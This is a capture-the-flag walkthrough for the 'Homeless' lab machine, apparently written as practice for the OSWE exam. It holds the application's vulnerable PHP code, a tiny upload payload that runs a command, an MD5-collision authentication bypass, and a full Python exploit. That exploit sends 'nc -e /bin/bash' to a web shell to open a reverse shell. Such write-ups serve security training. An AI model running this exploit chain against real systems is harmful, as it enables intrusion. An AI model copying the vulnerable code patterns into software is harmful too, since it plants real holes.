### Homeless - Authentication Bypass through MD5 Collision Attack

Within this walkthrough, I will skip any part not related to the web application exploitation, but for sake of consistency I would briefly explain what (and why) I skip.

#### Intro

Homeless is a funny CTF, and as web application black-box test it has some interesting points; however, the application, in PHP, is far from being complex. 

I will almost skip the discovery part, as in a Whitebox assessment has almost no meaning.

#### Directory structure

Stripping all useless resource files, the application's structure looks like the following:

```
/var/www/html
├── index.php
├── robots.txt
├── myuploader_priv
│   ├── files
│   │   ├── 887beed152a3e8f946857bade267bb19d159ef59.txt
│   │   ├── index.php
│   │   └── shell.php
│   └── index.php
└── d5fa314e8577e3a7b8534a014b4dcb221de823ad
    ├── admin.php
    ├── index.php
    └── index.php.bak
```

#### Vulnerability Discovery

We'll start looking at the index.php file, which contains an info to proceed to the next file to analyse: 

```php
<?php
$u_agent =  $_SERVER['HTTP_USER_AGENT'];
if(preg_match('/Cyberdog/i',$u_agent)){
        echo "Nice Cache!.. Go there.. ";
        echo "myuploader_priv";
}else{
        echo $u_agent;
}
?>
```

So, we are now aware that there is a restriction in place allowing only `HTTP USER AGENT`s containing the word 'Cyberdog'. The flow control is then passed to `/myuploader_priv/index.php`. In this file, we can detect a file upload functionality, as observable below:

```php
<?php
if($_SERVER['REQUEST_METHOD'] === "POST" && @$_POST['submit']){
        $filename = $_FILES["upme"]["name"];
    $des = 'files/' . basename($_FILES["upme"]["name"]);
    $filesize = $_FILES['upme']['size'];

    if($filesize > 8){
        echo "Your file is too large " . $filesize;
    }else{
        system("find files ! -name '887beed152a3e8f946857bade267bb19d159ef59.txt' ! -name 'index.php' -type f -exec rm -f {} +");
        if(move_uploaded_file($_FILES['upme']['tmp_name'], $des)){
            echo "File uploaded. Find the secret file on server .. files/".$filename;
        }
    }
}
?>
```
The system deletes any previous uploaded file before storing the file we're currently uploading. As we can see, no extension nor content check is performed during the upload phase, so we can upload any file type we want; however, we have an annoying restriction on the file size, which limit is 8 bytes, not really enough for an exploit, but enough to launch a command on the system:

```php
<?=`ls` // 7 characters
```
This will allow a black-box user to discover the content of the hidden file:
`/myuploader_priv/files/887beed152a3e8f946857bade267bb19d159ef59.txt`. This will take us to the next step of our analysis, the file `/d5fa314e8577e3a7b8534a014b4dcb221de823ad/index.php`.

The interesting part of the `index.php` resides in its authentication logic:

```php
<?php
if (($username == $password ) or ($username == $code)  or ($password == $code)) {echo 'Your input can not be the same.';}
else if ((md5($username) === md5($password) ) and (md5($password) === md5($code)) ) {
            echo "Well done!";
            $_SESSION["secret"] = '133720';
            header('Location: admin.php');  
```
Now we know that, in order to successfully login, we need to find 3 md5 collisions. This process may take some times to complete, however, we can get a big help from the great work of [Marc Stevens](https://marc-stevens.nl/research/) about hash collision attacks. A project on Github of *thereal1024*, based on his work, can be very helpful for our needs. [md5-collision](https://github.com/thereal1024/python-md5-collision)

If you're not really interested to have this tool among your own toolset, I uploaded three files ready to use [here](md5coll/f123.tar). Those three files are different, but their md5 hashes are the same. To prove that, it's enough to run:

```bash
$ md5sum f*
280329d5f2d5dca79041a4a9d50c2bff *f1
280329d5f2d5dca79041a4a9d50c2bff *f2
280329d5f2d5dca79041a4a9d50c2bff *f3
```

Now, in order to successfully send the entire content of the files without any modification, we will need to URL encode their content.

There are multiple tools that can URLencode a file, but I preferred to code this little python code:

```py
#!/usr/bin/python3
import sys
import urllib.parse

if len(sys.argv) < 1:
    print("[-] Missing file name")
else:
    try:    
        with  open(sys.argv[1],'rb') as f:
            contents = f.read()
            url = urllib.parse.quote(contents)
            print("[+] Urlencoded file:")
            print(url)
    except Exception as e:
        print("[-] Could not open file")
        print(e)
```

Using this script is possible to encode each file to be used within an HTTP Post request. If you try, you'll see it's possible to login using any combination of the files:

```bash
username=$(python3 urlencode.py f1 | grep -v Urlencoded)
password=$(python3 urlencode.py f2 | grep -v Urlencoded)
code=$(python3 urlencode.py f3 | grep -v Urlencoded)
```

Finally, we can review the last file, `admin.php`, that is actually a bit disappointing:

```php
<?php
if($_SERVER['REQUEST_METHOD'] === "POST" && isset($_POST['submit'])){
    $cmd = (string)$_POST['command'];
    echo "<pre>";system($cmd);echo "</pred>";
}

?>
```

Yes, it is a web shell. To simplify the exploitation process, netcat (traditional with -e option) is already installed on Homeless; so, getting a reverse shell is simple as you can imagine.

##### Wrapping Up

Summarising, in order to exploit the application, we'll undertake the following steps:

1. Bypass authentication using a md5 collision
2. Use the "webshell-like" admin page to get a reverse shell

The completed exploit:

```python
#!/usr/bin/python3

import requests
import argparse
import sys
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import subprocess
import os, sys, re
import binascii
import string, hashlib, time

def proxy(flag):
    return {"http" : "http://127.0.0.1:8080", "https" : "http://127.0.0.1:8080"} if flag else None

def geturl(target=None, type=None):
    if type == "login":
        return "http://" + target + "/d5fa314e8577e3a7b8534a014b4dcb221de823ad/index.php"
    elif type == "admin":
        return "http://" + target + "/d5fa314e8577e3a7b8534a014b4dcb221de823ad/admin.php"
    else:
        return None
        
def setup_listener(lport):
    print("[+] Setting up listener")
    try:
        if os.name == "nt":
            subprocess.Popen("start cmd /c nc.exe -lvp " + lport, shell=True)
        else:
            subprocess.Popen("gnome-terminal -- nc -lvkkp" + lport + "2>/dev/null", shell=True)
        time.sleep(1)
    except:
        print("[-] Could not setup listener")
        return False
    finally:
        return True
        
def md5_collisions():
    try:    
        with open("f1", "rb") as f1, open("f2", "rb") as f2, open("f3", "rb") as f3:
            try:
                return (urllib.parse.quote(f1.read()), urllib.parse.quote(f2.read()), urllib.parse.quote(f3.read()))
            except:
                print("[-] Cannot encode collisions files")
                sys.exit()
    except:
        print("[-] Cannot find md5 collisions files: f1, f2, f3")
        sys.exit()
        
def login(target, proxy):
    url = geturl(target,"login")
    username, password, code = md5_collisions()
    headers= { "Content-Type" : "application/x-www-form-urlencoded"}
    data = "username={}&password={}&code={}&login=Login".format( username, password, code)
    res = requests.post(url, headers=headers, data=data, proxies=proxy, allow_redirects=False, verify=False)
    if re.search(r"Well.*done",res.text):
        print("[+] Logged in successfully")
        return res.cookies
    else:
        return None

def revshell(target, lhost, lport, cookies, proxy):
    url = geturl(target,"admin")
    data = {"command": "nc -e /bin/bash {} {}".format(lhost,lport), "submit": "Invia richiesta"}
    try:
        requests.post(url, cookies=cookies, data=data, proxies=proxy, allow_redirects=False, verify=False, timeout=2)
    except requests.exceptions.ReadTimeout:
        return True
    except:
        raise


def exploit(target, lhost, lport, proxy):
    cookies = login(target, proxy)
    if not cookies:
        print("[-] Could not login")
        sys.exit()
    if setup_listener(lport):
        try:
            revshell(target, lhost, lport, cookies, proxy)
        except:
            print("[+] Reverse shell failed to open")
        
def main():
    parser = argparse.ArgumentParser(description='Upload a shell in ATutor')
    
    parser.add_argument(
        '-H', '--lhost', required=True, type=str, help='Local Listener IP Address')
    parser.add_argument(
        '-P', '--lport', required=True, type=str, default="443", help='Local Listener Port')
    parser.add_argument(
        '-x', '--proxy', required=False, action="store_true", help='Proxy (for debugging)')
    parser.add_argument(
        '-t', '--target', required=True, type=str, default=None, help='Homeless IP or domain')

    args = parser.parse_args()
    exploit(args.target, args.lhost, args.lport, proxy(args.proxy))

if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    main()
```

Launch like:
```bash
python exploit.py -t homeless.local -H 192.168.56.1 -P 444 -x
```

#### Conclusion

Homeless is a very nice machine when owned as "black-box", however, the small number of critical files to analyse, and the lack of complexity within the code, made it not enough of a challenge comparing it to the OSWE. The only really interesting piece of this box is the md5 collision vulnerability. If you're interested, I would advise getting more information on [Marc Stevens](https://marc-stevens.nl/research/) page and his [Hashclash](https://github.com/cr-marcstevens/hashclash) project.
